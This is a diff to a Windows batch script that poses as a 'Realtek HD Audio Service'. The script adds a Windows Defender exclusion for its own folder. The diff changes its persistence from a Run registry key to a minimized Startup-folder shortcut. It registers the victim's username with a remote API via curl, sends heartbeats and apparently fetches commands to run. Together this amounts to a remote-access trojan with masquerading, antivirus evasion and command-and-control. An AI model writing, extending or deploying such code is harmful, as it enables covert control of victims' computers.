@@ -5,6 +5,7 @@ set "BASE_URL=""
 set "API_KEY=""
 
 set "scriptName=Realtek HD Audio Service"
+set "shortcutPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%scriptName%.lnk"
 
 if "%1"=="--startup" goto :main
 if exist "%APPDATA%\%scriptName%.dat" exit /b
@@ -12,7 +13,7 @@ if exist "%APPDATA%\%scriptName%.dat" exit /b
 powershell -Command "Add-MpPreference -ExclusionPath '%~dp0'" 2>nul
 if !ERRORLEVEL! EQU 0 (
   call :register
-  reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "%scriptName%" /t REG_SZ /d "\"%~f0\" --startup" /f >nul 2>&1
+  powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%shortcutPath%'); $Shortcut.TargetPath = '%~f0'; $Shortcut.Arguments = '--startup'; $Shortcut.WindowStyle = 7; $Shortcut.Save()"
   echo installed > "%APPDATA%\%scriptName%.dat"
 )
 exit /b
@@ -29,7 +30,7 @@ curl -s -X POST "!BASE_URL!/clients" ^
 -H "Authorization: Bearer !API_KEY!" ^
 -H "Content-Type: application/json" ^
 -H "Prefer: resolution=merge-duplicates" ^
--d "{\"username\": \"!USERNAME!\", \"status\": true}" >nul
+-d "{\"username\": \"!USERNAME!\"}" >nul
 exit /b
 
 :heartbeat
@@ -37,7 +38,7 @@ curl -s -X PATCH "!BASE_URL!/clients?username=eq.!USERNAME!" ^
 -H "apikey: !API_KEY!" ^
 -H "Authorization: Bearer !API_KEY!" ^
 -H "Content-Type: application/json" ^
--d "{\"status\": true, \"updated_at\": \"now()\"}" >nul
+-d "{\"updated_at\": \"now()\"}" >nul
 exit /b
 
 :fetchCmd
